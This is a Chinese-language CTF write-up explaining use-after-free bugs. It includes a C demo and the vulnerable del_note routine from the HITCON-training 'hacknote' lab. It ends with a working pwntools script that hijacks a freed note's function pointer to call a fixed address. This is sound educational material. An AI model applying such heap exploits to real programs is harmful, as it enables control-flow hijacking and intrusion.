---
title: uaf
date: 2020-10-27
author: x1ngg3
description: "ヽ(✿ﾟ▽ﾟ)ノ"
category: PWN
tags:
- pwn
- ctf
---

ヽ(✿ﾟ▽ﾟ)ノ

<!-- more -->

### Introduction

简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况

- 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
- 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
- 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。

而我们一般所指的 **Use After Free** 漏洞主要是后两种。此外，**我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。**

这里给出一个简单的例子

```c
#include <stdio.h>
#include <stdlib.h>
typedef struct name {
  char *myname;
  void (*func)(char *str);
} NAME;
void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("call print my name\n"); }
int main() {
  NAME *a;
  a = (NAME *)malloc(sizeof(struct name));
  a->func = myprint;
  a->myname = "I can also use it";
  a->func("this is my function");
  // free without modify
  free(a);
  a->func("I can also use it");
  // free with modify
  a->func = printmyname;
  a->func("this is my function");
  // set NULL
  a = NULL;
  printf("this pogram will crash...\n");
  a->func("can not be printed...");
}
```



### HITCON-training lab 10 hacknote

可以看到，程序在`delete`的时候并没有把对应指针设置为`null`，由此存在uaf

```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(*(notelist[v1] + 1));
    free(notelist[v1]);                         // 先free 创建的，再free struct 存在 uaf
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

考虑到

1.先free的struct再free的用户创建的

2.ubuntu16下先分配最后free掉的fastbin

直接上脚本吧

### Exploit

```python
from pwn import *
sh = process("./hacknote")

def create(size,content):
    sh.recv()
    sh.sendline("1")
    sh.recv()
    sh.sendline(str(size))
    sh.recv()
    sh.sendline(str(content))

def delete(index):
    sh.recv()
    sh.sendline("2")
    sh.recv()
    sh.sendline(str(index))

def myprint(index):
    sh.recv()
    sh.sendline("3")
    sh.recv()
    sh.sendline(str(index))

create(8,12 * 'a')
create(16,"bbb")
delete("0")
delete("1 ")

sh.recv()
sh.sendline("1")
sh.recv()
sh.sendline("8")
sh.recv()
sh.sendline(p32(0x08048986))
myprint("0")
#gdb.attach(sh)
sh.interactive()
#create()
```



### Reference

[Use After Free](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/#use-after-free)